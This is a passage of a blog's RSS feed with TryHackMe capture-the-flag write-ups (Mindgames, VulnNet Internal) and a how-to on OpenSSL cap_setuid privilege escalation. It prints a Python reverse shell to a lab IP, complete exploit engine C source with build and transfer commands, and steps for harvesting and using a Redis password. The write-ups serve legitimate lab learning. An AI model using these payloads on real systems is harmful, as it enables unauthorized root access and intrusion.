&lt;p&gt;Any one line would tell you the parameter. How? &lt;code&gt;/rest/products/search?q=...&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The parameter is thus &lt;code&gt;q&lt;/code&gt;.&lt;/p&gt;
&lt;h4 id=&#34;what-endpoint-did-the-attacker-try-to-use-to-retrieve-files-include-the-&#34;&gt;What endpoint did the attacker try to use to retrieve files? (Include the /)&lt;/h4&gt;
&lt;p&gt;So, we are looking for file retrieving. This is found at the very end, once the hacker has done both the Hydra and sqlmap attacks.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/ftp&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;task-2-stolen-data&#34;&gt;Task 2. Stolen data&lt;/h2&gt;
&lt;h4 id=&#34;what-section-of-the-website-did-the-attacker-use-to-scrape-user-email-addresses&#34;&gt;What section of the website did the attacker use to scrape user email addresses?&lt;/h4&gt;
&lt;p&gt;We are looking for something related to users. Maybe socre board? Nope. Looking a bit earlier, we see product reviews! These are given as &lt;code&gt;/rest/product/x/reviews&lt;/code&gt; where &lt;code&gt;x&lt;/code&gt; is the product number (I&amp;rsquo;m guessing).&lt;/p&gt;
&lt;h4 id=&#34;was-their-brute-force-attack-successful-if-so-what-is-the-timestamp-of-the-successful-login-yaynay-11apr202109xxxx-0000&#34;&gt;Was their brute-force attack successful? If so, what is the timestamp of the successful login? (Yay/Nay, 11/Apr/2021:09:xx:xx +0000)&lt;/h4&gt;
&lt;p&gt;Yes it was. That&amp;rsquo;s how they were able to login. It is clear we are looking for Hydra part, since that is what was being used for bruteforcing.&lt;/p&gt;
&lt;p&gt;Now, we know Hydra stops after its found a password. So, we are looking at the last line? No! Hydra runs with a deafault thread size of 16. Which means we are looking at  &lt;em&gt;one&lt;/em&gt; of the last 16 attempts.&lt;/p&gt;
&lt;p&gt;We then find one with size that is anomalous and has a response of 200. That&amp;rsquo;s the one!&lt;/p&gt;
&lt;h4 id=&#34;what-user-information-was-the-attacker-able-to-retrieve-from-the-endpoint-vulnerable-to-sql-injection&#34;&gt;What user information was the attacker able to retrieve from the endpoint vulnerable to SQL injection?&lt;/h4&gt;
&lt;p&gt;Check the last UNION SELECT operations. We see &lt;code&gt;id, email, password, ...&lt;/code&gt; from &lt;code&gt;Users&lt;/code&gt; table. &lt;code&gt;id&lt;/code&gt; is not relevant for us.&lt;/p&gt;
&lt;h4 id=&#34;what-files-did-they-try-to-download-from-the-vulnerable-endpoint-endpoint-from-the-previous-task-question-5&#34;&gt;What files did they try to download from the vulnerable endpoint? (endpoint from the previous task, question #5)&lt;/h4&gt;
&lt;p&gt;We know the hackers were trying to get into ftp, which is what the question asks for.&lt;/p&gt;
&lt;p&gt;Checking the &lt;code&gt;vsftpd.log&lt;/code&gt;, we see the last two lines trying to get the two files!&lt;/p&gt;
&lt;h4 id=&#34;what-service-and-account-name-were-used-to-retrieve-files-from-the-previous-question-service-username&#34;&gt;What service and account name were used to retrieve files from the previous question? (service, username)&lt;/h4&gt;
&lt;p&gt;We see that anonymous login has been used for ftp.&lt;/p&gt;
&lt;h4 id=&#34;what-service-and-username-were-used-to-gain-shell-access-to-the-server-service-username&#34;&gt;What service and username were used to gain shell access to the server? (service, username)&lt;/h4&gt;
&lt;p&gt;Take a wild guess :kekw: It is present in the &lt;code&gt;auth.log&lt;/code&gt; file, when the access was successful, on &lt;code&gt;Apr 11 09:41:32&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Figured the log files. Job done!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Mindgames Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-mindgames-writeup/</link>
        <pubDate>Fri, 18 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-mindgames-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/K1GTB8e.png" alt="Featured image of post TryHackMe: Mindgames Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/mindgames&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Mindgames.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing too special here.&lt;/p&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
&lt;p&gt;I tried enumerating other directories in the website, but I did not find anything.&lt;/p&gt;
&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/70BECEk.png&#34; alt=&#34;webserver&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;This looks like the brainfuck language. Using a decoder &lt;a class=&#34;link&#34; href=&#34;https://www.dcode.fr/brainfuck-language&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt;. Decoding the first one, we get the resultant: &lt;code&gt;print(&amp;quot;Hello, World&amp;quot;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The second one is:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def F(n):
    if n &amp;lt;= 1:
        return 1
    return F(n-1)+F(n-2)


for i in range(10):
    print(F(i))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;both look python3. So &amp;hellip; could we put a python3 reverse shell?&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;I tried putting a vanilla python3 line, but it did not work. So, I tried encoding it first with brainfuck using &lt;a class=&#34;link&#34; href=&#34;https://copy.sh/brainfuck/text.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;this tool&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;encoding
&lt;img src=&#34;https://i.imgur.com/YdSrQnj.png&#34; alt=&#34;encoding&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;it works!
&lt;img src=&#34;https://i.imgur.com/686qr6L.png&#34; alt=&#34;works&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.revshells.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Get a reverse shell&lt;/a&gt;. I used the one below.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.17.8.184&amp;quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&amp;quot;sh&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Listening on a port.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444                               
listening on [any] 4444 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.28.151] 37062
$ python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
mindgames@mindgames:~/webserver$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are in!&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;p&gt;Upgrade the shell: &lt;code&gt;python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;I took some time enumerating and I found the below using &lt;code&gt;linpeas.sh&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep is writable
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;/usr/bin/openssl = cap_setuid+ep&lt;/code&gt; looks very interesting. &lt;a class=&#34;link&#34; href=&#34;https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Look at my blog here&lt;/a&gt; to figure how to use it. Running,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mindgames@mindgames:~/webserver$ openssl req -engine ./openssl-engine.so
openssl req -engine ./openssl-engine.so
root@mindgames:~/webserver# id
id
uid=0(root) gid=1001(mindgames) groups=1001(mindgames)
root@mindgames:~/webserver# cd /root
cd /root
root@mindgames:/root# cat roo
cat root.txt 
thm{yee_haww}
root@mindgames:/root# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are done!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>How to: OpenSSL cap_setuid&#43;ep PrivEsc Exploit</title>
        <link>https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/</link>
        <pubDate>Thu, 17 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/</guid>
        <description>&lt;img src="https://i.imgur.com/rZQE6hL.png" alt="Featured image of post How to: OpenSSL cap_setuid&#43;ep PrivEsc Exploit" /&gt;&lt;p&gt;Consider the binary &lt;code&gt;/usr/bin/openssl&lt;/code&gt; has capabilities set as: &lt;code&gt;/usr/bin/openssl = cap_setuid+ep&lt;/code&gt;
Is there a way to become root from a normal user by using this?&lt;/p&gt;
&lt;p&gt;YES! Let&amp;rsquo;s explore how.&lt;/p&gt;
&lt;h3 id=&#34;0-checklist-will-it-work-for-me&#34;&gt;0. Checklist: Will It Work For Me?&lt;/h3&gt;
&lt;p&gt;Search all the binaries&#39; capibilities using: &lt;code&gt;getcap -r / 2&amp;gt;/dev/null&lt;/code&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;getcap&lt;/code&gt; is the tool we will use&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-r&lt;/code&gt; is the recursive flag&lt;/li&gt;
&lt;li&gt;&lt;code&gt;2&amp;gt;/dev/null&lt;/code&gt; directs the standard error stream to &lt;code&gt;/dev/null&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;If you see &lt;code&gt;/usr/bin/openssl = cap_setuid+ep&lt;/code&gt;, we are set for success.&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&#34;1-requirements-on-your-system&#34;&gt;1. Requirements (On Your System)&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;We will use &lt;code&gt;#include &amp;lt;openssl/engine.h&amp;gt;&lt;/code&gt; header in our exploit engine file. On debian based systems, use: &lt;code&gt;sudo apt-get install libssl-dev&lt;/code&gt; to install.&lt;/li&gt;
&lt;li&gt;gcc&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;2-getting-the-exploit-ready&#34;&gt;2. Getting The Exploit Ready&lt;/h3&gt;
&lt;p&gt;Create a file named &lt;code&gt;openssl-exploit-engine.c&lt;/code&gt; with contents as such:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;openssl/engine.h&amp;gt;

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system(&amp;quot;/bin/bash&amp;quot;);
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()   
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Check the [2] reference for more information.&lt;/p&gt;
&lt;h3 id=&#34;3-compiling&#34;&gt;3. Compiling&lt;/h3&gt;
&lt;p&gt;Run the following:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gcc -shared -o openssl-exploit-engine.so -lcrypto openssl-exploit-engine.o&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Output for 1:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$  gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
openssl-exploit-engine.c: In function ‘bind’:
openssl-exploit-engine.c:5:3: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    5 |   setuid(0); setgid(0);
      |   ^~~~~~
openssl-exploit-engine.c:5:14: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    5 |   setuid(0); setgid(0);
      |              ^~~~~~
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It is safe to ignore warnings here. Resultant is the &lt;code&gt;openssl-exploit-engine.so&lt;/code&gt; file.&lt;/p&gt;
&lt;h3 id=&#34;4-transferring-the-file&#34;&gt;4. Transferring the file&lt;/h3&gt;
&lt;p&gt;Using &lt;code&gt;python3&lt;/code&gt;&amp;rsquo;s http server, and &lt;code&gt;wget&lt;/code&gt; or &lt;code&gt;curl&lt;/code&gt; on the target machine, we can transfer the file.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;[on your machine] start up python3 server in the directory where you have the file, as such: &lt;code&gt;sudo python3 -m http.server 80&lt;/code&gt;. this starts the server on port 80.&lt;/li&gt;
&lt;li&gt;[on target machine] use wget or curl the file as such: &lt;code&gt;wget YOUR_RELEVANT_IP/openssl-exploit-engine.so&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;5-root-finally&#34;&gt;5. Root (Finally!)&lt;/h3&gt;
&lt;p&gt;Once you have the file, run the following, at the location of the so file.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;openssl req -engine ./openssl-exploit-engine.so&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Sample output&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;user@server:~$ openssl req -engine ./openssl-exploit-engine.so
root@server:~# whoami
root
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Enjoy!&lt;/p&gt;
&lt;h3 id=&#34;6-common-errors&#34;&gt;6. Common Errors&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$  gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
openssl-exploit-engine.c:1:10: fatal error: openssl/engine.h: No such file or directory
    1 | #include &amp;lt;openssl/engine.h&amp;gt;
      |          ^~~~~~~~~~~~~~~~~~
compilation terminated.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you get this error, check the section on Requirements.&lt;/p&gt;
&lt;h3 id=&#34;7-references&#34;&gt;7. References&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Read up more on capabilities&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;OpenSSL building a useless engine&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/openssl/#library-load&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;How to use the library load feature OpenSSL&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: VulnNet Internal Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-vulnnet-internal-writeup/</link>
        <pubDate>Thu, 17 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-vulnnet-internal-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/3ec8CfD.png" alt="Featured image of post TryHackMe: VulnNet Internal Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/vulnnetinternal&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 993 closed ports
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
111/tcp  open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35488/udp6  mountd
|   100005  1,2,3      54985/tcp   mountd
|   100005  1,2,3      56181/tcp6  mountd
|   100005  1,2,3      56789/udp   mountd
|   100021  1,3,4      32910/udp   nlockmgr
|   100021  1,3,4      42203/tcp6  nlockmgr
|   100021  1,3,4      42497/tcp   nlockmgr
|   100021  1,3,4      49999/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp  open     rsync       (protocol version 31)
2049/tcp open     nfs_acl     3 (RPC #100227)
9090/tcp filtered zeus-admin
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m57s, deviation: 1h09m16s, median: 1s
| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| Names:
|   VULNNET-INTERNA&amp;lt;00&amp;gt;  Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   VULNNET-INTERNA&amp;lt;03&amp;gt;  Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   VULNNET-INTERNA&amp;lt;20&amp;gt;  Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   WORKGROUP&amp;lt;00&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
|_  WORKGROUP&amp;lt;1e&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2021-06-16T05:50:05+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-16T03:50:05
|_  start_date: N/A
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info gathered:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ssh open&lt;/li&gt;
&lt;li&gt;rpcbind looks interesting&lt;/li&gt;
&lt;li&gt;rsync working&lt;/li&gt;
&lt;li&gt;SMB open&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let&amp;rsquo;s start with SMB.&lt;/p&gt;
&lt;h3 id=&#34;12-smb-enumeration&#34;&gt;1.2. SMB Enumeration&lt;/h3&gt;
&lt;p&gt;Listing all the shares.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ smbclient -L 10.10.95.197 -N    

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using &lt;code&gt;smbclient //10.10.95.197/shares -N&lt;/code&gt; we can get in, and see all of the files in the directories. We see &lt;code&gt;temp&lt;/code&gt; and &lt;code&gt;data&lt;/code&gt; directories in &lt;code&gt;shares&lt;/code&gt;. One by one, I got all of the files, using the command:&lt;code&gt;get file_name.extension&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s all of what I got:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat business-req.txt 
We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.
                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat data.txt 
Purge regularly data that is not needed anymore
                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat services.txt 
THM{flag_was_here_yee}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;None of them are interesting, and this looks like a dead end. Let&amp;rsquo;s check out port 111, rpcbind.&lt;/p&gt;
&lt;h3 id=&#34;13-rpc-bind&#34;&gt;1.3. RPC-Bind&lt;/h3&gt;
&lt;p&gt;Googling, we get &lt;a class=&#34;link&#34; href=&#34;https://sites.cns.utexas.edu/oit-blog/blog/port-111-rpcbind-vulnerability&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;this&lt;/a&gt;. A DDoS attack. This is not useful for us.&lt;/p&gt;
&lt;p&gt;Okay, how about the NFS thingy listed in the nmap scan results, inside of RPC bind?&lt;/p&gt;
&lt;h3 id=&#34;14-nfs&#34;&gt;1.4. NFS&lt;/h3&gt;
&lt;p&gt;Let&amp;rsquo;s list them out. The &lt;code&gt;-e&lt;/code&gt; or &lt;code&gt;--exports&lt;/code&gt; flag gives us the export list of a server.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples]
└─$ showmount --exports 10.10.95.197
Export list for 10.10.95.197:
/opt/conf *
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Configuration files are usually very interesting. Let&amp;rsquo;s get these files on our system.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ mount -t nfs 10.10.95.197:/opt/conf conf
mount.nfs: failed to apply fstab options
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;What is happening here?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-t&lt;/code&gt; or &lt;code&gt;--type&lt;/code&gt; helps us specify the type of mount we want to do, which is &lt;code&gt;nfs&lt;/code&gt;. Common filesystem types are &lt;code&gt;ext2&lt;/code&gt;, &lt;code&gt;xfs&lt;/code&gt;, &lt;code&gt;brtfs&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;rest of the syntax is ssh-like&lt;/li&gt;
&lt;li&gt;&lt;code&gt;conf&lt;/code&gt; at the end is the name of the emptuy directory on my system&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Don&amp;rsquo;t forget the sudo option if &lt;code&gt;mount -t nfs&lt;/code&gt; gives you errors.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ sudo mount -t nfs 10.10.95.197:/opt/conf conf
[sudo] password for kali: 
                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd conf                  
                                                                        
┌──(kali㉿kali)-[/tmp/conf]
└─$ ls
hp  init  opt  profile.d  redis  vim  wildmidi
                                                                        
┌──(kali㉿kali)-[/tmp/conf]
└─$ tree .     
.
├── hp
│   └── hplip.conf
├── init
│   ├── anacron.conf
│   ├── lightdm.conf
│   └── whoopsie.conf
├── opt
├── profile.d
│   ├── bash_completion.sh
│   ├── cedilla-portuguese.sh
│   ├── input-method-config.sh
│   └── vte-2.91.sh
├── redis
│   └── redis.conf
├── vim
│   ├── vimrc
│   └── vimrc.tiny
└── wildmidi
    └── wildmidi.cfg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Quick googling tells me &lt;code&gt;redis&lt;/code&gt; is related to database. Things just got intersting!&lt;/p&gt;
&lt;h3 id=&#34;15-getting-in-redis&#34;&gt;1.5. Getting in Redis&lt;/h3&gt;
&lt;p&gt;Let&amp;rsquo;s search for passwords, using &lt;code&gt;pass&lt;/code&gt; or &lt;code&gt;password&lt;/code&gt; like terms.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp/conf]
└─$ grep -r &amp;quot;pass&amp;quot; .
./redis/redis.conf:# 2) No password is configured.
./redis/redis.conf:# If the master is password protected (using the &amp;quot;requirepass&amp;quot; configuration
./redis/redis.conf:# masterauth &amp;lt;master-password&amp;gt;
./redis/redis.conf:requirepass &amp;quot;B65Hx562F@ggAZ@F&amp;quot;
./redis/redis.conf:# resync is enough, just passing the portion of data the slave missed while
./redis/redis.conf:# 150k passwords per second against a good box. This means that you should
./redis/redis.conf:# use a very strong password otherwise it will be very easy to break.
./redis/redis.conf:# requirepass foobared
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since we have the password, one option is to use &lt;strong&gt;telnet&lt;/strong&gt;. It works using the same TCP/IP protocol we are familiar with. &lt;code&gt;telnet MACHINE_IP PORT_NUMBER&lt;/code&gt; gets you in. Use the command &lt;code&gt;AUTH mmm&lt;/code&gt;, where mmm is the password to authorize yourself.&lt;/p&gt;
&lt;p&gt;Alternatively, download &lt;code&gt;redis-cli&lt;/code&gt;, which looks better and has autocomplete suggestions.&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://lzone.de/cheat-sheet/Redis&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Redis Cheat Sheet here&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/]
└─$ redis-cli -h 10.10.95.197 -a &amp;quot;B65Hx562F@ggAZ@F&amp;quot;
Warning: Using a password with &#39;-a&#39; or &#39;-u&#39; option on the command line interface may not be safe.
10.10.95.197:6379&amp;gt; keys *
1) &amp;quot;tmp&amp;quot;
2) &amp;quot;authlist&amp;quot;
3) &amp;quot;int&amp;quot;
4) &amp;quot;internal flag&amp;quot;
5) &amp;quot;marketlist&amp;quot;
10.10.95.197:6379&amp;gt; type &amp;quot;internal flag&amp;quot;
string
10.10.95.197:6379&amp;gt; get &amp;quot;internal flag&amp;quot;
&amp;quot;THM{ff8e518addbbddb74531a724236a8221}&amp;quot;
10.10.95.197:6379&amp;gt; type &amp;quot;marketlist&amp;quot;
list
10.10.95.197:6379&amp;gt; type &amp;quot;authlist&amp;quot;
list
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The commands are self explanatory.&lt;/p&gt;
&lt;h3 id=&#34;exploring-redis&#34;&gt;Exploring Redis&lt;/h3&gt;
&lt;p&gt;What about &lt;code&gt;marketlist&lt;/code&gt;?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;10.10.95.197:6379&amp;gt; lrange marketlist 0 9000
1) &amp;quot;Machine Learning&amp;quot;
2) &amp;quot;Penetration Testing&amp;quot;
3) &amp;quot;Programming&amp;quot;
4) &amp;quot;Data Analysis&amp;quot;
5) &amp;quot;Analytics&amp;quot;
6) &amp;quot;Marketing&amp;quot;
7) &amp;quot;Media Streaming&amp;quot;
10.10.95.197:6379&amp;gt; type &amp;quot;Machine Learning&amp;quot;
none
10.10.95.197:6379&amp;gt; type &amp;quot;Analytics&amp;quot;
none
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing. What about &lt;code&gt;authlist&lt;/code&gt;?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;10.10.95.197:6379&amp;gt; lrange &amp;quot;authlist&amp;quot; 0 9000
